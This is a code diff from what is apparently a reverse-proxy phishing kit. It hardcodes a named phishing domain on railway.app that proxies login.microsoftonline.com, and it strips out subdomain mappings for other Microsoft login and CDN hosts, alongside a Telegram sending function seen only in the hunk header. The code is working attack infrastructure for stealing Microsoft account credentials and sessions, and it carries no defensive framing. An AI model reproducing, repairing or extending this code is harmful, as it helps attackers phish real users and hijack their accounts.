@@ -31,16 +31,14 @@ async function sendToTelegram(message) {
 // ==================== END TELEGRAM ====================
 
 // ==================== CARLOS TECHNIQUES: DOMAIN MAPPING ====================
-const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'triumphant-adventure-production-8a49.up.railway.app';
-const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';
+const PHISHING_DOMAIN = 'triumphant-adventure-production-8a49.up.railway.app';
+const TARGET_HOST = 'login.microsoftonline.com';
 
+// Just map the main domain – no subdomains
 const SUBDOMAIN_MAPPING = {
     [PHISHING_DOMAIN]: TARGET_HOST,
-    [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
-    [`office.${PHISHING_DOMAIN}`]: 'www.office.com',
-    [`cdn.${PHISHING_DOMAIN}`]: 'aadcdn.msftauth.net',
-    [`static.${PHISHING_DOMAIN}`]: 'aadcdn.msauth.net',
-    [`live.${PHISHING_DOMAIN}`]: 'login.live.com'
+    // If you need other Microsoft subdomains, map them to the same phishing domain
+    // For CDN resources, you can add more, but they'll all resolve to the same server
 };
 const REVERSE_MAPPING = {};
 for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
